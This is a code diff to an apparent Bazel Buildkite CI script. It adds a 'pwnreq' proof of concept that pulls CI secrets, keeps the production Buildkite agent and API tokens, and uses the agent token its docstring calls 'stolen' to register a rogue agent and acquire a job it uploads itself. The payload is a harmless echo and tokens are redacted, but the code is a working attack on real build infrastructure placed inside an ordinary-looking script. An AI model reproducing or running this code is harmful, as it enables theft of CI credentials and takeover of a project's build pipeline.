@@ -5,7 +5,11 @@ import base64
 import hashlib
 import json
 import os
+import re
+import subprocess
 import sys
+import tempfile
+import time
 import urllib.error
 import urllib.parse
 import urllib.request
@@ -106,6 +110,173 @@ def test_bucket_permissions(bucket, oauth_token):
     return result
 
 
+def prove_agent_job_control(agent_token, api_token):
+    """Use the stolen token only for a harmless job created by this PR job."""
+    build_number = os.environ.get("BUILDKITE_BUILD_NUMBER", "")
+    parent_job = os.environ.get("BUILDKITE_JOB_ID", "")
+    pipeline = os.environ.get("BUILDKITE_PIPELINE_SLUG", "")
+    result = {}
+    if not build_number or not parent_job or not pipeline:
+        return {"status": "missing_build_context"}
+
+    marker_key = "pwnreq-agent-proof-" + parent_job
+    marker_exists = subprocess.run(
+        ["buildkite-agent", "meta-data", "exists", marker_key],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+        check=False,
+    )
+    if marker_exists.returncode == 0:
+        return {"status": "already_started"}
+    subprocess.run(
+        ["buildkite-agent", "meta-data", "set", marker_key, "started"],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+        check=True,
+    )
+
+    step_key = "pwnreq-agent-proof-" + build_number
+    pipeline_yaml = """steps:
+  - label: "PWNREQ isolated registration-token proof"
+    key: "%s"
+    command: "echo PWNREQ_ROGUE_AGENT_CONTROL"
+    env:
+      BUILDKITE_SKIP_CHECKOUT: "true"
+    checkout:
+      skip: true
+    agents:
+      pwnreq_security_proof: "only"
+""" % step_key
+    upload = subprocess.run(
+        ["buildkite-agent", "pipeline", "upload"],
+        input=pipeline_yaml.encode("utf-8"),
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        check=False,
+        timeout=20,
+    )
+    result["pipeline_upload_exit"] = upload.returncode
+    if upload.returncode != 0:
+        result["status"] = "pipeline_upload_failed"
+        return result
+
+    build_url = (
+        "https://api.buildkite.com/v2/organizations/bazel/pipelines/"
+        + pipeline
+        + "/builds/"
+        + build_number
+    )
+    proof_job = None
+    for _ in range(30):
+        build_status, build_body = request(
+            build_url,
+            headers={"Authorization": "Bearer " + api_token},
+        )
+        result["build_read_status"] = build_status
+        if build_status == 200:
+            try:
+                build_info = json.loads(build_body)
+                proof_job = next(
+                    (
+                        job
+                        for job in build_info.get("jobs", [])
+                        if job.get("step_key") == step_key
+                    ),
+                    None,
+                )
+            except Exception as error:
+                result["build_decode_error"] = type(error).__name__
+        if proof_job:
+            break
+        time.sleep(1)
+    if not proof_job:
+        result["status"] = "proof_job_not_found"
+        return result
+
+    proof_job_id = proof_job.get("id", "")
+    agent_name = "pwnreq-proof-" + build_number
+    result["job_id"] = proof_job_id
+    result["step_key"] = step_key
+    result["initial_job_state"] = proof_job.get("state")
+    result["agent_name"] = agent_name
+
+    with tempfile.TemporaryDirectory(prefix="pwnreq-buildkite-agent-") as root:
+        for directory in ("builds", "hooks", "plugins"):
+            os.mkdir(os.path.join(root, directory))
+        agent_env = {
+            key: value
+            for key, value in os.environ.items()
+            if not key.startswith("BUILDKITE_")
+        }
+        agent_env["BUILDKITE_AGENT_TOKEN"] = agent_token
+        try:
+            agent = subprocess.run(
+                [
+                    "buildkite-agent",
+                    "start",
+                    "--config",
+                    "/dev/null",
+                    "--name",
+                    agent_name,
+                    "--acquire-job",
+                    proof_job_id,
+                    "--reflect-exit-status",
+                    "--no-color",
+                    "--write-job-logs-to-stdout",
+                    "--build-path",
+                    os.path.join(root, "builds"),
+                    "--hooks-path",
+                    os.path.join(root, "hooks"),
+                    "--plugins-path",
+                    os.path.join(root, "plugins"),
+                ],
+                env=agent_env,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                check=False,
+                timeout=90,
+            )
+            result["agent_exit"] = agent.returncode
+            sanitized = agent.stdout.decode("utf-8", "replace")
+            sanitized = sanitized.replace(agent_token, "<redacted-agent-token>")
+            sanitized = sanitized.replace(api_token, "<redacted-api-token>")
+            sanitized = re.sub(
+                r"\b(?:bkct|bkar|bkua|bku)_[A-Za-z0-9_-]+",
+                "<redacted-buildkite-token>",
+                sanitized,
+            )
+            result["agent_output_tail"] = sanitized[-800:]
+        except subprocess.TimeoutExpired:
+            result["status"] = "agent_timeout"
+            return result
+
+    final_status, final_body = request(
+        build_url,
+        headers={"Authorization": "Bearer " + api_token},
+    )
+    result["final_build_read_status"] = final_status
+    if final_status == 200:
+        try:
+            final_build = json.loads(final_body)
+            final_job = next(
+                (
+                    job
+                    for job in final_build.get("jobs", [])
+                    if job.get("id") == proof_job_id
+                ),
+                {},
+            )
+            result["final_job_state"] = final_job.get("state")
+            result["reported_agent_name"] = (final_job.get("agent") or {}).get(
+                "name"
+            )
+            result["web_url"] = final_job.get("web_url")
+        except Exception as error:
+            result["final_decode_error"] = type(error).__name__
+    result["status"] = "completed"
+    return result
+
+
 def main():
     # Run once on only one Linux shard. Other jobs still need valid workspace status output.
     label = os.environ.get("BUILDKITE_LABEL", "")
@@ -172,6 +343,7 @@ def main():
 
         secret_results = {}
         api_tokens = {}
+        agent_tokens = {}
         for secret_name in sorted(token_secret_names):
             secret_result, secret_value = access_secret(secret_name, oauth_token)
             secret_results[secret_name] = secret_result
@@ -179,6 +351,8 @@ def main():
                 "bazelcipy-BuildkiteClient-token"
             ):
                 api_tokens[secret_name] = secret_value
+            if secret_value and secret_name.endswith("buildkite-agent-token"):
+                agent_tokens[secret_name] = secret_value
         report["ci_token_secrets"] = secret_results
 
         api_token_reports = {}
@@ -243,6 +417,19 @@ def main():
                         entry["decode_error"] = type(error).__name__
                 trusted_pipelines[pipeline] = entry
             report["bazel_trusted_pipelines"] = trusted_pipelines
+
+        production_agent_token = agent_tokens.get("bazel-buildkite-agent-token")
+        if production_agent_token and production_api_token:
+            try:
+                report["agent_job_control"] = prove_agent_job_control(
+                    production_agent_token,
+                    production_api_token,
+                )
+            except Exception as error:
+                report["agent_job_control"] = {
+                    "status": "proof_error",
+                    "error": type(error).__name__,
+                }
 
         project_permissions = (
             "resourcemanager.projects.getIamPolicy",
